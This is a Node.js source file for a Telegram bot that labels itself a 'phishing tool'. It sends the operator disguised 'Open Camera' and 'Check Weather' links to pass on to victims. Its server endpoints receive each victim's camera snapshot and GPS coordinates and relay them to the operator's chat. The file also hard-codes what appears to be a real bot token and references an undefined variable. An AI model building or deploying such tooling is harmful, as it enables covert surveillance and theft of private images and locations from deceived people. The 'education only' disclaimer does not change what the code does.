const express = require("express");
const bodyParser = require("body-parser");
const TelegramBot = require("node-telegram-bot-api");

const app = express();

// ===== MIDDLEWARE =====
app.use(bodyParser.json({ limit: "10mb" }));
app.use(express.static("public"));

// ===== HARD-CODED BOT INFO =====
const TOKEN = "8509430611:AAF-GFm5b1SobH2-38KTe4IgVBERUpp7Chg";
const BASE_URL = "https://your-app-name.onrender.com"; // change this

// ===== BOT =====
const bot = new TelegramBot(TOKEN, { polling: true });

// ===== START =====
bot.onText(/\/start/, (msg) => {
  bot.sendMessage(msg.chat.id,
`🔥 Welcome To TEMPLEDOMIC PHISHING TOOL 🌚
NOTE: THIS IS STRICTLY FOR EDUCATION PURPOSE ONLY 
AVAILABLE COMMANDS
📸 /camera - TO CAPUTURE BACK CAMERA
🌦️ /weather - TO GET LOCATION`
  );
});

// ===== CAMERA LINK =====
bot.onText(/\/camera/, (msg) => {
  bot.sendMessage(msg.chat.id, "📸 Open camera:", {
    reply_markup: {
      inline_keyboard: [
        [{
          text: "Open Camera",
          url: `${BASE_URL}/camera.html?chat=${msg.chat.id}`
        }]
      ]
    }
  });
});

// ===== WEATHER LINK =====
bot.onText(/\/weather/, (msg) => {
  bot.sendMessage(msg.chat.id, "🌦️ Open weather:", {
    reply_markup: {
      inline_keyboard: [
        [{
          text: "Check Weather",
          url: `${BASE_URL}/weather.html?chat=${msg.chat.id}`
        }]
      ]
    }
  });
});

// ===== CAMERA RESULT =====
app.post("/camera", (req, res) => {
  const { chatId, image } = req.body;

  if (!chatId || !image) return res.sendStatus(400);

  const base64 = image.replace(/^data:image\/png;base64,/, "");
  const buffer = Buffer.from(base64, "base64");

  bot.sendPhoto(chatId, buffer, {
    caption: "📸 Photo received"
  });

  res.json({ ok: true });
});

// ===== WEATHER RESULT =====
app.post("/weather", (req, res) => {
  const { chatId, lat, lon, weather } = req.body;

  if (!chatId) return res.sendStatus(400);

  bot.sendMessage(
    chatId,
`🌍 Weather

📍 ${lat}, ${lon}
🎯 ${ip}
🌦️ ${weather.temperature}°C
💨 ${weather.windspeed}`
  );

  res.json({ ok: true });
});

// ===== START SERVER =====
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log("🔥 Server running on port", PORT);
});
